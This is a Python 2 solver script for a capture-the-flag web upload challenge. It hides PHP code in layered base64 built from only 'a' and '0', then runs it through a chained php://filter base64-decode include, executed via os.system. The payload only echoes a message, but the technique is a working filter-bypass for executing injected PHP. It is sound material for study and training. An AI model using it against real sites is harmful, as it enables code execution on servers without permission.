#!/usr/bin/env python
# encoding:utf-8
# Author : WangYihang
# Date : 2017/10/03
# Email : wangyihanger@gmail.com
# Comment : to solve XDCTF-2017-WEB-Upload

import string
import itertools
import os

base64_chars = string.letters + string.digits + "+/"


def robust_base64_decode(data):
    robust_data = ""
    base64_charset = string.letters + string.digits + "+/"
    for i in data:
        if i in base64_charset:
            robust_data += i
    robust_data += "=" * (4 - len(robust_data) % 4)
    return robust_data.decode("base64").replace("\n", "")


def robust_base64_encode(data):
    return data.encode("base64").replace("\n", "").replace("=", "")


def enmu_table(allow_chars):
    possible = list(itertools.product(allow_chars, repeat=4))
    table = {}
    for list_data in possible:
        data = "".join(list_data)
        decoded_data = data.decode("base64")
        counter = 0
        t = 0
        for x in decoded_data:
            if x in base64_chars:
                counter += 1
                t = x
        if counter == 1:
            table[t] = data
    return table


def generate_cipher(tables, data):
    encoded = robust_base64_encode(data)
    result = encoded
    for d in tables[::-1]:
        encoded = result
        result = ""
        for i in encoded:
            result += d[i]
    return result


def enmu_tables(allow_chars):
    filename = "".join(allow_chars)
    tables = []
    saved_length = 0
    flag = True
    while True:
        table = enmu_table(allow_chars)
        length = len(table.keys())
        if saved_length == length:
            flag = False
            break
        saved_length = length
        # print "[+] %d => %s" % (length, table)
        print "[+] Got %d chars : %s" % (length, table.keys())
        tables.append(table)
        allow_chars = table.keys()
        if set(table.keys()) >= set(base64_chars):
            break
    if flag:
        return tables
    return False


def main():
    data = "<?php echo 'Hacked By Lilac!';?>"
    print "[+] Base64 chars : %s" % (base64_chars)
    print "[+] Plain : %s" % (data)
    chars = "a0"
    print "[+] Start charset : [%s]" % (chars)
    filename = chars
    print "[+] Generating tables..."
    tables = enmu_tables(set(chars))
    if tables:
        print "[+] Trying to encode data..."
        cipher = generate_cipher(tables, data)
        with open(filename, "w") as f:
            f.write(cipher)
            print "[+] The encoded data is saved to file (%d Bytes) : %s" % (len(cipher), filename)
        command = "php -r 'include(\"" + "php://filter/convert.base64-decode/resource=" * (
            len(tables) + 1) + "%s\");'" % (filename)
        print "[+] Usage : %s" % (command)
        print "[+] Executing..."
        os.system(command)
    else:
        print "[-] Failed : %s" % (tables)


if __name__ == "__main__":
    main()
